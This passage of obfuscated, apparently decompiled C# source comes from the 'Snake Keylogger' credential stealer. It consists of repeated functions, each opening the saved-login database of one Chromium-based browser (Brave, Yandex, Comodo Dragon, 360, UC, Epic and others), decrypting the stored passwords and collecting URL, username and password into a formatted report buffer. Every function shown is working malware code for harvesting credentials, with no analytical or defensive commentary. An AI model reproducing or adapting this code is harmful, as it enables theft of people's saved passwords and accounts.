          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Ghost\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 꾯اУܣR()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\CentBrowser\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Cent\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Թή̧թ\u02F3()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Xvast\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: xVast\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFD㹃ɢ\u0385ɛ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Chedot\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Chedot\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFD嵱\uFFFDB\uFFFD()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\SuperBird\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Superbird\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 丐\uF0B9ʪ콪\uFFFD()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\360Browser\\Browser\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: 360\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ܪŔ̔\u26CA\u07B4()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\360Chrome\\Chrome\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: 360\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFD\uFFFDԌ\uFFFD\u061D()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Comodo\\Dragon\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Comodo\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Ӥ\uFFFDéҏÒ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Brave\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u05B5̱\uFFFDߡŴ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Torch\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Torch\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void מΩ\uFFFD\uFFFDչ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\UCBrowser\\User Data_i18n\\Default\\UC Login Data.18";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("wow_logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: UC\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFDζɩ\u005E㹃()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Blisk\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Blisk\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ױߡԌ\uFFFD\u07FB()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Epic Privacy Browser\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Epic\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u07B9ε\uDAE4\uDE26\u07B8()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Yandex\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ēӤ؜ƌô()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Nichrome\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Nichrome\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0314泮ϒK\uFFFD()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Amigo\\User Data\\Default\\Login Data";
      try
      {
